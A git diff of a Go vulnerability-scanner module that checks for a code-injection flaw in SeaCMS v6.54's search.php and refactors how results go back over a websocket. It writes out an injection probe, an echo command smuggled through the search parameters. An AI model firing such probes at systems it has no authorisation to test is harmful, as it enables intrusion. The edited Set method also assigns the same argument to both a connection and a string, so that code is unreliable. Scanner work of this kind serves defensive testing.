@@ -13,6 +13,7 @@ import (
 
 // SeaCMSv654 search.php code injection.
 type SeaCMSv654 struct {
+	mconn   *muxConn
 	target  string
 	Existed string
 }
@@ -22,24 +23,25 @@ func NewSeaCMSv654() *SeaCMSv654 {
 	return &SeaCMSv654{}
 }
 
-// Set implements POC interface.
-// Params should be {target string}
+// Set implements PoC interface.
+// Params should be {conn *websocket.Conn, target string}
 func (s *SeaCMSv654) Set(v ...interface{}) {
+	s.mconn = &muxConn{conn: v[0].(*websocket.Conn)}
 	s.target = v[0].(string)
 }
 
-// Report implements POC interface.
+// Report implements PoC interface.
 func (s *SeaCMSv654) Report() interface{} {
 	return s.Existed
 }
 
-// Run implements POC interface.
-func (s *SeaCMSv654) Run(conn *websocket.Conn) {
+// Run implements PoC interface.
+func (s *SeaCMSv654) Run() {
 	logger.Green.Println("Checking SeaCMSv6.54 Vuls...")
-	s.check(conn)
+	s.check()
 }
 
-func (s *SeaCMSv654) check(conn *websocket.Conn) {
+func (s *SeaCMSv654) check() {
 	cmd := `?echo"AssassinGooo";`
 	payload := url.Values{}
 	payload.Add("searchtype", "5")
@@ -75,6 +77,6 @@ func (s *SeaCMSv654) check(conn *websocket.Conn) {
 			"host":    s.target,
 			"existed": s.Existed,
 		}
-		conn.WriteJSON(ret)
+		s.mconn.send(ret)
 	}
 }
